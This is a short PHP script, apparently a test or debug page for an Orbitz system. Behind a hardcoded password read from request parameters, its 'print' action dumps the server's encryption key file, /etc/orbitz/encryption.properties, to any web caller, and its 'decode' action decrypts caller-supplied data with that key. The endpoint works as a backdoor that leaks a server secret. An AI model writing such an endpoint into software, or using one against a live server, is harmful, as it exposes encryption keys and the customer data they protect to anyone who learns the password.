<?php
function OrbitzDecrypt($data, $key=NULL) {
    if ($key == NULL) {
        $ini_array = parse_ini_file("/etc/orbitz/encryption.properties");
        $key = $ini_array['encryption.key'];
    }
    $unhexed_key = pack('H*', $key);
    $unhexed_data = pack('H*', $data);
    $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $unhexed_key, $unhexed_data, MCRYPT_MODE_CBC);
    $trimlen = ord(substr($decrypted, -1));
    return substr($decrypted, 0, -($trimlen));
}

function printProperties()
{
    $enc_properties_file_path = "/etc/orbitz/encryption.properties";
    $filecontents             = file_get_contents($enc_properties_file_path);
    print $filecontents;
}


if(!empty($_REQUEST['pass']) && $_REQUEST['pass'] == 'h0telclubt3st'){
    $data = !empty($_REQUEST['data']) ? $_REQUEST['data'] : null;
    $action = !empty($_REQUEST['action']) ? $_REQUEST['action'] : 'decode';

    $enc_properties_file_path = "/etc/orbitz/encryption.properties";

    switch($action){
        case 'print':
            if(file_exists($enc_properties_file_path)) {
                printProperties();
            }
            break;


        case 'decode':
            if(file_exists($enc_properties_file_path)){
                OrbitzDecrypt($data);
            }
            break;

        default:
            echo 'nothing to test';
            break;
    }




}

